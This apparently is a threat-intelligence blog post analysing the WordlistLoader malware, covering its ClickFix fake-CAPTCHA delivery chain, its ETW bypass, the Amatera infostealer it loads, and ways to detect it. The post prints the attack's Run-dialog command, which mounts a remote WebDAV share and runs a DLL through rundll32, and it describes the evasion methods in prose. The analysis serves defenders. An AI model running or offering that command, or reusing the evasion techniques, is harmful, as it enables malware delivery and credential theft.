+++
title = "WordlistLoader: Shellcode Hidden as Plain English Words"
date = "2026-08-24"
+++

WordlistLoader is an obfuscated loader that encodes shellcode as a dictionary of ordinary English words. Each byte of shellcode maps to a specific word in an array, allowing raw payload bytes to pass through text filters without triggering binary entropy detectors. A related variant maps shellcode to 16-byte UUID strings to accomplish the same obfuscation.

## Multi-tier delivery architecture

The delivery relies on the ClickFix social engineering pattern across several infrastructure layers:

```text
Compromised website
  └─ Injected base64 JavaScript
      └─ Fetches stager script from an Ethereum smart contract (EtherHiding)
          └─ Executes ClickFix fake CAPTCHA interface
              └─ Prompts victim to execute command in Run dialog (Win+R)
                  └─ conhost -> hidden cmd.exe -> mount WebDAV share
                      └─ rundll32.exe executes remote DLL
                          └─ WordlistLoader decodes shellcode
                              └─ Reflective loading -> Amatera stealer
```

The operators combine compromised web servers, public blockchain transactions, and CDN links like jsDelivr to host initial scripts. Using smart contracts allows the operators to update redirector URLs without changing the injected JavaScript on the compromised sites.

The Run dialog command mounts a remote WebDAV share:

```batch
conhost.exe --headless cmd.exe /c
  pushd \\webdav-share@SSL\path &
  rundll32.exe loader.dll,Entry
```

Using `conhost --headless` hides console windows, while WebDAV mounts let `rundll32.exe` execute the DLL directly over the network without writing the file to the local disk.

## ETW bypass via hardware breakpoints

To prevent endpoint detection and response (EDR) agents from logging API calls, WordlistLoader neutralizes Event Tracing for Windows (ETW) using hardware breakpoints rather than in-memory patching. 

Traditional ETW bypasses overwrite the entry point of `EtwEventWrite` with a return (`ret`, `0xC3`) instruction, which modern memory integrity scanners flag quickly. WordlistLoader instead sets a CPU debug register on the function prologue. When execution hits the breakpoint, the exception handler intercepts control and redirects execution around the logging routine, leaving the function bytes on disk and in memory unaltered.

## Amatera payload capabilities

The final stage is Amatera (version 4.3.3-alpha1), an infostealer featuring several evasive techniques:

- Direct and indirect system call invocation through Heaven's Gate / WoW64 transitions to bypass user-mode hooks.
- Bypasses for Google Chrome's Application-Bound Encryption (ABE) to extract protected cookie databases and saved credentials.
- In-memory credential theft across Chromium and Gecko browsers.

## Detection opportunities

While individual layers swap URLs and obfuscation schemes, the execution behavior leaves recognizable indicators:

Audit `rundll32.exe` command lines for WebDAV UNC paths (`\\*\...`). Executing DLLs directly from remote UNC paths over WebDAV is rare in legitimate administrative environments. Sysmon Event ID 1 (Process Creation) capturing `rundll32` targeting remote paths provides high-fidelity detection.

Monitor processes manipulating CPU debug registers (`GetThreadContext` and `SetThreadContext`) outside debugging tools.

Educate users on ClickFix prompts. Legitimate verification dialogs never require users to open the Windows Run dialog or paste terminal commands into an administrative shell.
